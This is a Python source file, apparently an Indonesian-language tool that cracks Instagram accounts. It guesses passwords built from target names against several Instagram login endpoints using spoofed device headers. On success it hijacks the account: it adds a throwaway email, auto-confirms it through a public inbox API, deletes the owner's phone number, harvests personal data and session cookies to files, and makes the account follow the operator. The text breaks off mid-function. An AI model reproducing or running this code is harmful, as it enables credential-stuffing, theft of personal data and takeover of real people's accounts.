        Pro.add_row("[b italic blue]03.[white]", "[b italic]     api2.instagram.com", "[b italic blue]ON")
        Pro.add_row("[b italic blue]04.[white]", "[b italic]      www.instagram.com", "[b italic blue]ON")
        Cons().print(Pro,justify="center",width=80,style='b white')
        hide_IGF = Cons().input('[b italic white][[blue]?[white]] Masukan pilihan [white]([blue]1[white]/[blue]2[white]/[blue]3[white]) : ')
        if hide_IGF =='01' or hide_IGF =='1':
            self.MH.append('i.instagram.com')
        elif hide_IGF =='02' or hide_IGF =='2':
            self.MH.append('api.instagram.com')
        elif hide_IGF =='03' or hide_IGF =='3':
            self.MH.append('api2.instagram.com')
        elif hide_IGF =='04' or hide_IGF =='4':
            self.MH.append('www.instagram.com')
        else:pass
        facerip(Cinta('[b italic white]Apakah anda ingin menggunakan bot [blue]auto follow[white] akun sendiri, jika mendapatkan hasil [green]OK',width=80, padding=(0,1), style='b white'))
        BotIGF = Cons().input('[b italic white][[blue]?[white]] Masukan pilihan [white]([blue]y[white]/[blue]t[white]) : ')
        if BotIGF =='ya' or BotIGF =='y':
            self.mengikuti.append('ya')
            facerip(Cinta('[b italic white]Masukan satu username akun instagram anda dan akun tersebut harus publik, contoh : [blue]patner.hmei03',width=80, padding=(0,1), style='b white'))
            self.akunIGF = Cons().input('[b italic white][[blue]*[white]] Username : ')
        else:pass
        Cons().print(Cinta.fit("[b italic blue]jika mendapatkan hasil [green]OK[blue] result belum muncul, tunggu saja karna result sangat berat akibat kebanyakan opsi",title="[italic red]WARNING",style="b white"),justify='center')
        facerip(Cinta('[b italic green]OK[white] otomatis tersimpan di internal folder [green]OK[white]/[green]{}\n[italic yellow]CP[white] otomatis tersimpan di internal folder [yellow]CP[white]/[yellow]{}'.format(okc,cpc),width=80, padding=(0,1),subtitle=f"[b italic blue] Mainkan Mode Pesawat Setiap 300 ID", style='b white'))
        prog = Progress(
            SpinnerColumn('moon'),
            TextColumn("{task.description}"),
            TimeElapsedColumn(),
            TextColumn("{task.percentage:.0f}%")
        )
        des = prog.add_task('',total=len(dumping))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as V:
                for akun in dumping:
                    user = akun.split("|")[0]
                    nama = akun.split("|")[1].lower()
                    for sandi in nama.split(" "):
                        if len(sandi)==3 or len(sandi)==4 or len(sandi)==5:
                            password = [
                                sandi,
                                sandi+"123",
                                sandi+"1234",
                                sandi+"12345",
                                sandi+"321",
                                sandi.lower()
                            ]
                        else:
                            password = [
                                sandi,
                                sandi+"123",
                                sandi+"1234",
                                sandi+"12345",
                                sandi+"321",
                                sandi.lower()
                            ]
                        if 'i.instagram.com' in self.MH:
                            V.submit(self.Ins,user,password)
                        elif 'api.instagram.com' in self.MH:
                            V.submit(self.Api,user,password)
                        elif 'api2.instagram.com' in self.MH:
                            V.submit(self.Api2,user,password)
                        elif 'www.instagram.com' in self.MH:
                            V.submit(self.Ajax,user,password)
                        else:
                            V.submit(self.Api,user,password)
        
        if self.success == 0 and self.chekpoint == 0:
            Cons().print()
            Cons().print(Cinta.fit("[b italic blue]Opsss, anda tidak mendapatkan hasil",style="white"),justify='center');sys.exit()
        else:
            Cons().print()
            Cons().print(Cinta.fit(f"[b italic blue]Selamat, anda mendapatkan hasil OK : [green]%s [white] dan hasil CP : [yellow]%s"%(self.success,self.chekpoint),style="white"),justify='center');sys.exit()      
       
    def Info(self, user):
        try:
            with requests.Session() as XYZ:
              req=XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(user),headers={"user-agent": UA}).json()["data"]["user"]
              userid=req['id']
              nama=req["full_name"]
              verified=req['is_verified']
              privates=req['is_private']
              biograph=req['biography']
              pengikut =req["edge_followed_by"]["count"]
              mengikuti=req["edge_follow"]["count"]
              postingan=req["edge_owner_to_timeline_media"]["count"]
              pictures=req['profile_pic_url_hd']
        except:
              userid='False'
              nama='False'
              verified='False'
              privates='False'
              biograph='False'
              pengikut='False'
              mengikuti='False'
              postingan='False'
              pictures='False'
        return userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures
     
    def info2(self, cokz):
        try:
            with requests.Session() as XYZ:
                data=XYZ.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies={"cookie":cokz}, headers={"user-agent":UA}).json()["form_data"]
                ultah=data['birthday']
                email=data['email']
                nomer=data["phone_number"].replace("-", "").replace(" ", "")
        except:
                ultah="False"
                email="False"
                nomer="False"
        return ultah,email,nomer
        
    def data_graph(self, xxx):
        data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
        }
        return(data)
       
    def headers_graph(self, xxx):
        headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
        }
        return(headers)
    
    def ClientId(self, xxx):
        try:
            Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
            return Clients
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: facetime(5); self.ClientId(xxx)
       
    def AccountId(self, xxx):
        try:
            Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
            return(Userid)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: facetime(5); self.AccountId(xxx)
        
    def AddEmail(self, cokz):
        try:
            with requests.Session() as XYZ:
                usem = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(5))
                email = ('{}@inboxkitten.com'.format(usem))
                resp = XYZ.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cokz}).text
                head = self.headers_graph(resp)
                head.update({
                    'Host': 'accountscenter.instagram.com',
                    'x-fb-friendly-name': 'FXAccountsCenterAddContactPointMutation',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                })
                data = self.data_graph(resp)
                data.update({
                    'fb_api_req_friendly_name':'FXAccountsCenterAddContactPointMutation',
                    'variables':json.dumps({"country":"ID","contact_point":email,"contact_point_type":"email","selected_accounts":[f"{self.AccountId(resp)}"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700479648287"}),
                    'doc_id':'6970150443042883'
                })
                response = XYZ.post('https://accountscenter.instagram.com/api/graphql/', data=data,headers=head, cookies={'cookie':cokz}).text
                if '"success":true' in str(response):
                    exculator.update({'email':f'{email}'})
                    kode, url = self.FindCode(email.split('@')[0])
                    data.update({
                        'fb_api_req_friendly_name':'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                        'variables':json.dumps({"contact_point":email,"contact_point_type":"email","pin_code":f"{kode}","selected_accounts":[f"{self.AccountId(resp)}"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"mutation_id_1700481379041","contact_point_event_type":"ADD","normalized_contact_point_to_replace":""}),
                        'doc_id':'6973420842719905'
                    })
                    head.update({'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation'})
                    reaponse2 = XYZ.post('https://accountscenter.instagram.com/api/graphql/', data=data,headers=head, cookies={'cookie':cokz}).text
                    if '"success":true' in str(response2):
                        exculator.update({'di-konfirmasi':True,'Url':url})
                    else:
                        exculator.update({'di-konfirmasi':False,'Url':url})
                else:
                    exculator.update({'di-konfirmasi':False})
                    exculator.update({'email':f'{email} Tidak Di Tambahkan','Url':None})
        except:
                exculator.update({'di-konfirmasi':False})
                exculator.update({'email':f'{email} Tidak Di Tambahkan','Url':None})
        return exculator
     
    def FindCode(self, nama):
        while True:
            try:
                with requests.Session() as XYZ:
                    inb = XYZ.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={nama}').text
                    key = re.findall('"key":"(.*?)"', str(inb))
                    roq = re.findall('"region":"(.*?)"', str(inb))
                    if len(key) > 0 or len(roq) > 0:
                        break
            except:pass
            try:
                 req = par(XYZ.get('https://inboxkitten.com/api/v1/mail/getHtml',
                 params={'region': roq[0], 'key':key[0]},
                 headers={'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}).text,'html.parser')
                 for xnzz in req.find_all('td'):
                     if 'Harap konfirmasi alamat email ini agar kami dapat memperbarui informasi kontak Anda. Anda mungkin diminta untuk memasukkan kode konfirmasi ini:' in str(xnzz) or 'Harap konfirmasi alamat email ini' in req:
                         kode = re.findall('kode konfirmasi ini:(\d+)', str(xnzz.text))
                         if len(kode) >0:
                            return kode[0], f'https://inboxkitten.com/inbox/{nama}/list'
                     else: continue
            except:
                 return None, f'https://inboxkitten.com/inbox/{nama}/list'

    def GetPhone(self, cokz, status={}):
        try:
            with requests.Session() as XYZ:
                resp = XYZ.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cokz}).text
                head = self.headers_graph(resp)
                head.update({
                   'Host': 'accountscenter.instagram.com',
                   'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                   'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'})
                data = self.data_graph(resp)
                data.update({
                   'fb_api_req_friendly_name':'FXAccountsCenterContactPointRootQuery',
                   'variables':json.dumps({"interface":"IG_WEB"}),
                   'doc_id':'6253939098058154'
                })
                response = XYZ.post('https://accountscenter.instagram.com/api/graphql/', data=data,headers=head, cookies={'cookie':cokz}).text
                if '"all_contact_points"' in str(response):
                    pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(response)).group(1)
                    head.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
                    data.update({
                        'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                        'variables':json.dumps({"normalized_contact_point":pone,"contact_point_type":"PHONE_NUMBER","selected_accounts":[f"{self.AccountId(resp)}"],"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),
                        'doc_id':'6716611361758391'
                    })
                    response2 = XYZ.post('https://accountscenter.instagram.com/api/graphql/',data=data,headers=head, cookies={'cookie':cokz}).text
                    if '"success":false' in response2:status.update({'Dihapus':False,'Number':pone})
                    else:status.update({'Dihapus':True,'Number':pone})
                else:pass       
        except Exception as e:
            status.update({'Dihapus':False,'Number':'Kesalahan'})
        return(status)

    def Api(self,user,password):
         prog.update(des,description=f'\r[b italic blue]IGF.Cracking [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]')
         prog.advance(des)
         ua = str(random.choice([Device().ua_RMX(),Device().ua_INF(),Device().ua_POCO()]))
         for pas in password:
             try:
                 with requests.Session() as XYZ:
                     curl = XYZ.get('https://api.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                     payload = json.dumps({
                         'phone_id': str(uuid.uuid4()),
                         '_csrftoken': curl.cookies.get('csrftoken',''),
                         'username': user,
                         'guid': str(uuid.uuid4()),
                         'device_id': 'android-'+str(uuid.uuid4()),
                         'password': pas,
                         'from_reg': 'false',
                         'login_attempt_count': '0'
                     })
                     param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
                     encod  = f'ig_sig_key_version=4&signed_body={param}'
                     header = {
                         'Authority': 'api.instagram.com',
                         'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                         'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                         'Accept': '*/*',
                         'X-IG-Connection-Type': str(random.choice(['MOBILE(LTE)', 'WIFI'])),
                         'X-IG-App-ID': '936619743392459',
                         'Accept-Encoding': 'gzip, deflate',
                         'Accept-Language': 'id-ID',
                         'X-IG-ABR-Connection-Speed-KBPS': '0',
                         'User-Agent': ua,
                         'Connection': 'keep-alive',
                         'X-IG-Capabilities': str(random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM='])),
                         'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'}
                     response = XYZ.post('https://api.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
                     if 'logged_in_user' in str(response.text):
                         self.success+=1
                         cokz = ";".join([key+"="+value.replace('"','') for key, value in XYZ.cookies.get_dict().items()])   
                         try:
                             ganti_mail = self.AddEmail(cokz)
                             curll, email_new, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                             konfirmasi_ora = 'Di Konfirmasi' if status_email is True else ''
                             telepon = self.GetPhone(cokz)
                             status_pon, phone = telepon['Dihapus'], telepon['Number']
                             hapus_ora = f'{phone} Di Hapus' if status_pon is True else f'{phone} Tidak Di Hapus'
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [green]: {}'.format(user))
                             Ok.add('[b italic white]password [green]: {}'.format(pas))
                             Ok.add('[b italic white]user id  [green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [green]: {}'.format(nama))
                             Ok.add('[b italic white]biograph [green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor akun [green]: {}'.format(nomer))
                             Ok.add('[b italic white]email akun [green]: {}'.format(email))
                             Ok.add('[b italic white]lahir akun [green]: {}'.format(ultah))
                             Ok.add('[b italic white]email baru [green]: {} {}'.format(email_new, konfirmasi_ora))
                             Ok.add('[b italic white]curl email [green]: {}'.format(curll))
                             Ok.add('[b italic white]hapus nomor [green]: {}'.format(hapus_ora)).add('[b italic white]cookies [green]: {}'.format(cokz)).add('[b italic white]user-agent [green]: {}'.format(ua))
                             facerip(Dev)
                             if 'ya' in self.mengikuti:
                                 req = XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(self.akunIGF),headers={"user-agent":UA}).json()["data"]["user"]
                                 convert_id = req['id']
                                 XYZ.headers.update({
                                     "Host": "i.instagram.com",
                                     "content-length": "0",
                                     "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                                     "x-ig-app-id": "1217981644879628",
                                     "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                                     "sec-ch-ua-mobile": "?1",
                                     "x-instagram-ajax": "1006447742",
                                     "viewport-width": "360",
                                     "content-type": "application/x-www-form-urlencoded",
                                     "accept": "*/*",
                                     "user-agent": UA,
                                     "x-asbd-id": "198387",
                                     "save-data": "on",
                                     "x-csrftoken": re.search('csrftoken=(.*?);',cokz).group(1),
                                     "sec-ch-ua-platform": '"Android"',
                                     "origin": "https://www.instagram.com",
                                     "sec-fetch-site": "same-site",
                                     "sec-fetch-mode": "cors",
                                     "sec-fetch-dest": "empty",
                                     "referer": "https://www.instagram.com/",
                                     "accept-encoding": "gzip, deflate, br",
                                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"})
                                 XYZ.cookies.update({'cookie':cokz})
                                 XYZ.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format(convert_id))
                             else:pass
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break
                         except Exception as e:
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [italic green]: {}'.format(user))
                             Ok.add('[b italic white]password [italic green]: {}'.format(pas))
                             Ok.add('[b italic white]user  id  [italic green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [italic green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [italic green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [italic green]: {}'.format(nama))                            
                             Ok.add('[b italic white]biograph [italic green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [italic green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [italic green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [italic green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [italic green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor [italic green]: {}'.format(nomer))
                             Ok.add('[b italic white]email [italic green]: {}'.format(email))
                             Ok.add('[b italic white]lahir [italic green]: {}'.format(ultah))
                             Ok = Dev.add('[b italic white]cookies [italic green]: {}'.format(cokz))
                             Ok.add('[b italic white]user-agent [italic green]: {}'.format(ua))
                             facerip(Dev)
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break

                     elif 'https://i.instagram.com/challenge/' in str(response.text):
                         nama, pengikut, mengikuti, postingan = self.Info(user)
                         Dev = Moch_Arip('\r        ',guide_style="bold")
                         Cp = Dev.add('[italic blue]KLEIN [red]» [yellow]OK')
                         Cp.add('[b italic white] name [italic yellow]: {}'.format(nama))
                         Cp.add('[b italic white] username [italic yellow]: {}'.format(user))
                         Cp.add('[b italic white] password [italic yellow]: {}'.format(pas))
                         Cp.add('[b italic white] pengikut [italic yellow]: {}'.format(pengikut))
                         Cp.add('[b italic white] mengikuti [italic yellow]: {}'.format(mengikuti))
                         Cp.add('[b italic white] postingan [italic yellow]: {}'.format(postingan))
                         Cp = Dev.add('[b italic white] user-agent [italic yellow]: {}'.format(ua))
                         facerip(Cp)
                         self.chekpoint+=1
                         with open('CP/'+cpc,'a') as simpan:
                            simpan.write(user+'|'+pas+'\n')
                         break
             except requests.exceptions.ConnectionError:
                 prog.update(des,description=f'\r[b italic red]IGF.Spam [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]');prog.advance(des);facetime(31)
         self.looping+=1

    def Ins(self,user,password):
         prog.update(des,description=f'\r[b italic blue]IGF.Cracking [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]')
         prog.advance(des)
         ua = str(random.choice([Device().ua_RMX(),Device().ua_INF(),Device().ua_POCO()]))
         for pas in password:
             try:
                 with requests.Session() as XYZ:
                     curl = XYZ.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                     payload = json.dumps({
                         'phone_id': str(uuid.uuid4()),
                         '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                         'username': user,
                         'guid': str(uuid.uuid4()),
                         'device_id': 'android-'+str(uuid.uuid4()),
                         'password': pas,
                         'login_attempt_count': '0',
                     })
                     param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
                     encod  = f'ig_sig_key_version=4&signed_body={param}'
                     header = {
                         'Authority': 'i.instagram.com',
                         'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                         'Connection': 'Close',
                         'User-Agent': ua,
                         'X-IG-Capabilities': str(random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM='])),
                         'X-IG-App-ID': '936619743392459',
                         'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2;ig_nrcb=1'}
                     response = XYZ.post('https://i.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
                     if 'logged_in_user' in str(response.text):
                         self.success+=1
                         cokz = ";".join([key+"="+value.replace('"','') for key, value in XYZ.cookies.get_dict().items()])   
                         try:
                             ganti_mail = self.AddEmail(cokz)
                             curll, email_new, status_email = ganti_mail['Url'], ganti_mail['email'], ganti_mail['di-konfirmasi']
                             konfirmasi_ora = 'Di Konfirmasi' if status_email is True else ''
                             telepon = self.GetPhone(cokz)
                             status_pon, phone = telepon['Dihapus'], telepon['Number']
                             hapus_ora = f'{phone} Di Hapus' if status_pon is True else f'{phone} Tidak Di Hapus'
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [green]: {}'.format(user))
                             Ok.add('[b italic white]password [green]: {}'.format(pas))
                             Ok.add('[b italic white]user id  [green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [green]: {}'.format(nama))
                             Ok.add('[b italic white]biograph [green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor akun [green]: {}'.format(nomer))
                             Ok.add('[b italic white]email akun [green]: {}'.format(email))
                             Ok.add('[b italic white]lahir akun [green]: {}'.format(ultah))
                             Ok.add('[b italic white]email baru [green]: {} {}'.format(email_new, konfirmasi_ora))
                             Ok.add('[b italic white]curl email [green]: {}'.format(curll))
                             Ok.add('[b italic white]hapus nomor [green]: {}'.format(hapus_ora)).add('[b italic white]cookies [green]: {}'.format(cokz)).add('[b italic white]user-agent [green]: {}'.format(ua))
                             facerip(Dev)
                             if 'ya' in self.mengikuti:
                                 req = XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(self.akunIGF),headers={"user-agent":UA}).json()["data"]["user"]
                                 convert_id = req['id']
                                 XYZ.headers.update({
                                     "Host": "i.instagram.com",
                                     "content-length": "0",
                                     "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                                     "x-ig-app-id": "1217981644879628",
                                     "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                                     "sec-ch-ua-mobile": "?1",
                                     "x-instagram-ajax": "1006447742",
                                     "viewport-width": "360",
                                     "content-type": "application/x-www-form-urlencoded",
                                     "accept": "*/*",
                                     "user-agent": UA,
                                     "x-asbd-id": "198387",
                                     "save-data": "on",
                                     "x-csrftoken": re.search('csrftoken=(.*?);',cokz).group(1),
                                     "sec-ch-ua-platform": '"Android"',
                                     "origin": "https://www.instagram.com",
                                     "sec-fetch-site": "same-site",
                                     "sec-fetch-mode": "cors",
                                     "sec-fetch-dest": "empty",
                                     "referer": "https://www.instagram.com/",
                                     "accept-encoding": "gzip, deflate, br",
                                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"})
                                 XYZ.cookies.update({'cookie':cokz})
                                 XYZ.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format(convert_id))
                             else:pass
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break
                         except Exception as e:
                             userid,nama,verified,privates,biograph,pengikut,mengikuti,postingan,pictures = self.Info(user)
                             ultah,email,nomer = self.info2(cokz)
                             Dev = Moch_Arip('\r        ',guide_style="blue")
                             Ok = Dev.add('[italic blue]KLEIN [red]» [green]OK')
                             Ok.add('[b italic white]username [italic green]: {}'.format(user))
                             Ok.add('[b italic white]password [italic green]: {}'.format(pas))
                             Ok.add('[b italic white]user  id  [italic green]: {}'.format(userid))
                             Ok.add('[b italic white]verified [italic green]: {}'.format(verified))
                             Ok.add('[b italic white]privates [italic green]: {}'.format(privates))
                             Ok.add('[b italic white]fullname [italic green]: {}'.format(nama))                            
                             Ok.add('[b italic white]biograph [italic green]: {}'.format(biograph))
                             Ok.add('[b italic white]feedpost [italic green]: {}'.format(postingan))
                             Ok.add('[b italic white]follower [italic green]: {}'.format(pengikut))
                             Ok.add('[b italic white]followed [italic green]: {}'.format(mengikuti))
                             Ok.add('[b italic white]pictures [italic green]: {}'.format(pictures))
                             Ok = Dev.add('[italic blue]Info Akun [red]» [green]OK')
                             Ok.add('[b italic white]nomor [italic green]: {}'.format(nomer))
                             Ok.add('[b italic white]email [italic green]: {}'.format(email))
                             Ok.add('[b italic white]lahir [italic green]: {}'.format(ultah))
                             Ok = Dev.add('[b italic white]cookies [italic green]: {}'.format(cokz))
                             Ok.add('[b italic white]user-agent [italic green]: {}'.format(ua))
                             facerip(Dev)
                             with open('OK/'+okc,'a') as simpan:
                                 simpan.write(user+'|'+pas+'|'+cokz+'\n')
                             break

                     elif 'https://i.instagram.com/challenge/' in str(response.text):
                         nama, pengikut, mengikuti, postingan = self.Info(user)
                         Dev = Moch_Arip('\r        ',guide_style="bold")
                         Cp = Dev.add('[italic blue]KLEIN [red]» [yellow]OK')
                         Cp.add('[b italic white] name [italic yellow]: {}'.format(nama))
                         Cp.add('[b italic white] username [italic yellow]: {}'.format(user))
                         Cp.add('[b italic white] password [italic yellow]: {}'.format(pas))
                         Cp.add('[b italic white] pengikut [italic yellow]: {}'.format(pengikut))
                         Cp.add('[b italic white] mengikuti [italic yellow]: {}'.format(mengikuti))
                         Cp.add('[b italic white] postingan [italic yellow]: {}'.format(postingan))
                         Cp = Dev.add('[b italic white] user-agent [italic yellow]: {}'.format(ua))
                         facerip(Cp)
                         self.chekpoint+=1
                         with open('CP/'+cpc,'a') as simpan:
                            simpan.write(user+'|'+pas+'\n')
                         break
             except requests.exceptions.ConnectionError:
                 prog.update(des,description=f'\r[b italic red]IGF.Spam [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]');prog.advance(des);facetime(31)
         self.looping+=1

    def Api2(self,user,password):
         prog.update(des,description=f'\r[b italic blue]IGF.Cracking [white][ OK : [green]{self.success}[white] ]—[ CP : [yellow]{self.chekpoint}[white] ] [ Die [blue]: {len(dumping)}/{self.looping} [white]]')
         prog.advance(des)
         ua = str(random.choice([Device().ua_RMX(),Device().ua_INF(),Device().ua_POCO()]))
         for pas in password:
             try:
                 with requests.Session() as XYZ:
                     curl = XYZ.get('https://graph.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                     payload = json.dumps({
                         'phone_id': str(uuid.uuid4()),
                         '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                         'username': user,
                         'guid': str(uuid.uuid4()),
                         'device_id': 'android-'+str(uuid.uuid4()),
                         'password': pas,
                         'login_attempt_count': '0',
                       })
